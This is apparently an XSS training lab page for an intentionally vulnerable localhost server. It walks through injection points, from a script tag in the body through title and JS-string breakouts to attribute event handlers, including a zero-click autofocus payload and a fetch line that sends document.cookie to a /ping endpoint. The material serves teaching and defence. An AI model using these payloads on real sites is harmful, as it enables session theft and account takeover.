Attack 01 — Script Tag Injection (Mechanism 1)

Module 04 · Use this page alongside the tutorial. Start your lab server, then work through each section in order. Keep DevTools Console and Network panels open.

⚠ The lab server endpoints used here are intentionally vulnerable. They exist solely for controlled study. Never deploy this server beyond localhost.
STEP 1

Confirm the Injection PointBody Context

First, confirm that the server reflects your input unchanged. Send benign HTML and verify it renders. This is always the first step in manual XSS testing — prove the reflection before escalating. 

<b>hello from injection</b>
Click "Test in new tab" → verify bold text appears in the page
If bold text renders, the server is reflecting your HTML raw into the page body. Open DevTools Elements panel on the /search page and find the injected <b> element in the DOM tree.
STEP 2

Script Tag — Body ContextBody Context

Now escalate. Inject a <script> tag. The server reflects it directly into the HTML body, the browser parses it, and the script executes at parse time — before the page finishes loading. 

<script>alert(document.domain)</script>
What to observe: The alert fires immediately on page load — you typed nothing, clicked nothing on the victim page. The origin shown is localhost. In a real attack this would be the target domain, and the payload would exfiltrate cookies instead of showing an alert. 
<script>fetch('http://localhost:5000/ping?stolen='+document.cookie)</script>
Realistic exfiltration payload: This sends the page's cookies to an attacker-controlled endpoint as a URL parameter. Watch the Network panel — you will see the /ping request with ?stolen= in the URL. In Module 15, the callback_server captures these.
STEP 3

Breaking Out of Title/Style to Reach ScriptContext Escape → Body

Many vulnerabilities don't place your input in the body — they place it inside a <title>, <style>, or another tag. The technique is the same: close the enclosing element, then inject your script tag. 

</title><script>alert('escaped title context')</script>
The </title> closes the page's title block. Everything after it is in the body context. The script tag now executes normally. Open View Source (Ctrl+U) to see where your injection lands in the raw HTML.
STEP 4

Script Context Injection (JS String Escape)Script Context

When input lands inside a <script> block as a string value, the attacker breaks out of the JS string with a quote, then injects arbitrary JavaScript. The // at the end comments out the remainder of the original line to prevent syntax errors. 

";alert(document.domain);//
The server embeds your input into: var searchQuery = "[INPUT]"; Your payload closes the string ("), ends the statement (;), executes alert, then comments out the rest (;//). Result: var searchQuery = "";alert(document.domain);//"; 
";

</script><script>alert('tag break from script context')</script><p>
Alternative: close the entire </script> block with the literal sequence </script> — the HTML parser responds to this even inside a JS string. A new script block is opened. This is why you must NEVER embed user data in <script> blocks via string concatenation.
STEP 5

Attribute Break — No Angle Brackets NeededAttribute Context

When input lands inside an HTML attribute value, the attacker doesn't need < or > at all. A " closes the attribute, and then a new attribute (like an event handler) can be added. 

" onmouseover="alert(document.domain)" x="
The server produces: <input value="" onmouseover="alert(document.domain)" x="">. Hover over the input box on the resulting page — the alert fires. The trailing x=" absorbs the original closing " so the HTML remains syntactically valid. Open View Source to see this clearly. 
" autofocus onfocus="alert(document.domain)
Zero-interaction version: autofocus causes the browser to focus the input immediately on page load, triggering onfocus without any user action. This is a full zero-click payload delivered via attribute injection.
